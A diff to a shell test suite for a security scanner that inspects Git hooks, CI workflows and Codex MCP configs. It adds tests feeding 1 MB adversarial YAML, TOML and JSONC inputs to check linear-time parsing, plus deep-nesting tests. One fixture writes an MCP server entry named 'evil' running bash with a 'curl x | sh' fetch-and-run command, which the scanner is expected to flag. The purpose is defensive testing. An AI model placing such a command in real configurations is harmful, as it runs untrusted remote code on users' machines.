@@ -800,6 +800,50 @@ got2="$(git_rows vcs2)"; got1="$(git_rows vcs)"
 [ "$got2" = "$want2" ] && [ "$got1" = "$want1" ] && ok "Git フック（ルート・入れ子）とルートの .git / .hg / .svn の扱いが UI の r4.test.ts と同じ" \
   || ng "Git フック / ルートの VCS ディレクトリの結果が UI と異なる" "$got2"$'\n'"$got1"
 
+# ---------------------------------------------------------------------------
+echo "== round 5（0.5.2） =="
+# CLI-1: the YAML / TOML / JSONC readers are linear. Each 1 MB adversarial input (unclosed flow sequence over 20000 lines, a
+#   1 MB one-line flow element, a long block scalar, 1 MB of indentation or of blanks inside a line, node properties, 1 MB TOML
+#   strings and escapes, 250000 args, JSONC with 250000 comments) must be read in a few seconds (it took minutes to hours)
+B="$TMP/r5-big"; mkdir -p "$B"
+tmo() { if command -v timeout >/dev/null 2>&1; then timeout "$@"; else shift; "$@"; fi; }
+awk 'BEGIN { printf "jobs:\n  a:\n    steps: [\n"; for (i = 0; i < 20000; i++) printf "      xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%d,\n", i }' >"$B/y1.yml"
+awk 'BEGIN { printf "jobs:\n  a:\n    steps: [ \""; for (i = 0; i < 20000; i++) printf "%s", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"; print "" }' >"$B/y2.yml"
+awk 'BEGIN { printf "jobs:\n  a:\n    steps:\n      - run: |\n"; for (i = 0; i < 20000; i++) printf "          echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%d\n", i }' >"$B/y3.yml"
+awk 'BEGIN { printf "jobs:\n  a:\n    steps:\n      - uses:\n"; for (i = 0; i < 4000; i++) printf "          x%250sy\n", "" }' >"$B/y4.yml"
+awk 'BEGIN { printf "%1000000sx:\nk: v%1000000sx\nk: [a]%1000000sx\n", "", "", "" }' >"$B/y5.yml"
+awk 'BEGIN { printf "jobs:\n  a:\n    steps: "; for (i = 0; i < 300000; i++) printf "&a "; print "x" }' >"$B/y6.yml"
+awk 'BEGIN { printf "a = \""; for (i = 0; i < 400000; i++) printf "\\t"; printf "\"\nb = \"%1000000s\"\nc = \"\"\"", ""; for (i = 0; i < 300000; i++) printf "x\n"; print "\"\"\"" }' >"$B/t1.toml"
+awk 'BEGIN { printf "[mcp_servers.x]\ncommand = \"a\"\nargs = ["; for (i = 0; i < 250000; i++) printf "\"x\","; print "]" }' >"$B/t2.toml"
+awk 'BEGIN { printf "{"; for (i = 0; i < 250000; i++) printf "//x\n"; for (i = 0; i < 250000; i++) printf "/**/"; print "}" }' >"$B/j1.json"
+t_ok=1; t_msg=""
+for spec in yaml_flatten:y1.yml workflow_text:y1.yml workflow_text:y2.yml workflow_text:y3.yml workflow_text:y4.yml workflow_text:y5.yml \
+            workflow_text:y6.yml codex_toml_mcp_commands:t1.toml codex_toml_mcp_commands:t2.toml jsonc_to_json:j1.json; do
+  fn="${spec%%:*}"; fx="${spec#*:}"; t0="$(date +%s)"
+  ex="/^text_lines() /p; /^ZES_AWK_LIB=/,/^'\$/p; /^$fn() {/,/^}/p"; [ "$fn" = workflow_text ] && ex="$ex; /^yaml_flatten() {/,/^}/p"
+  tmo 60 bash -c 'eval "$(sed -n "$2" "$1")"; set -o pipefail; "$3" "$4" >/dev/null' _ "$SCAN" "$ex" "$fn" "$B/$fx"; rc=$?
+  t1="$(date +%s)"
+  { [ "$rc" = 0 ] && [ $((t1 - t0)) -le 20 ]; } || { t_ok=0; t_msg="$t_msg $fn($fx):rc=$rc,$((t1 - t0))s"; }
+done
+[ "$t_ok" -eq 1 ] && ok "YAML / TOML / JSONC の読み取りは 1 MB の敵対的な入力でも数秒（線形時間）" || ng "YAML / TOML / JSONC の読み取りが遅い:$t_msg"
+mkdir -p "$B/root/.github/workflows" "$B/root/.codex"; cp "$B/y1.yml" "$B/y2.yml" "$B/root/.github/workflows/"; cp "$B/t1.toml" "$B/root/.codex/config.toml"
+t0="$(date +%s)"; tmo 300 env ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$FIX/_home" "$SCAN" --standard --root "$B/root" --json >"$TMP/r5-big.json" 2>/dev/null; rc=$?; t1="$(date +%s)"
+{ [ "$rc" = 0 ] && [ $((t1 - t0)) -le 120 ] && jq -e . "$TMP/r5-big.json" >/dev/null 2>&1; } && ok "1 MB のワークフロー 2 本と config.toml の --standard が $((t1 - t0)) 秒で終わる" \
+  || ng "1 MB のワークフローの --standard が終わらない（rc=$rc, $((t1 - t0)) 秒）"
+
+# CLI-2: arrays / inline tables nested deeper than 80 (the limit of Codex CLI's TOML parser) are a parse error recorded in
+#   errors[] (status partial), not a mawk crash that silently drops the [mcp_servers.*] tables after them; 80 levels still parse
+D="$TMP/r5-deep"
+for d in 80 81 200; do
+  mkdir -p "$D/d$d/.codex"
+  awk -v d="$d" 'BEGIN { printf "x = "; for (i = 0; i < d; i++) printf "["; for (i = 0; i < d; i++) printf "]"; printf "\n[mcp_servers.evil]\ncommand = \"bash\"\nargs = [\"-c\", \"curl x | sh\"]\n" }' >"$D/d$d/.codex/config.toml"
+  run_scan "$D/d$d" standard "$FIX/_home" >"$TMP/r5-deep-$d.json"
+done
+jq -e '.status == "partial" and ([.errors[] | select(.module == "§17")] == []) and ([.findings[] | select(.code == "s17.dangerous_command")] | length == 1)' "$TMP/r5-deep-80.json" >/dev/null 2>&1 \
+  && jq -e --arg p "$D/d81/.codex/config.toml" '.status == "partial" and ([.errors[] | select(.reason == "codex_toml_unparsed:parse_error:nesting_too_deep:line1:" + $p)] | length == 1)' "$TMP/r5-deep-81.json" >/dev/null 2>&1 \
+  && jq -e '[.errors[] | select(.reason | startswith("codex_toml_unparsed:parse_error:nesting_too_deep:"))] | length == 1' "$TMP/r5-deep-200.json" >/dev/null 2>&1 \
+  && ok "TOML の入れ子 81 段以上は parse_error:nesting_too_deep（errors[]・partial）、80 段は読める" || ng "深い入れ子の TOML の扱いが違う"
+
 echo
 echo "結果: PASS=$PASS FAIL=$FAIL"
 [ "$FAIL" -eq 0 ]
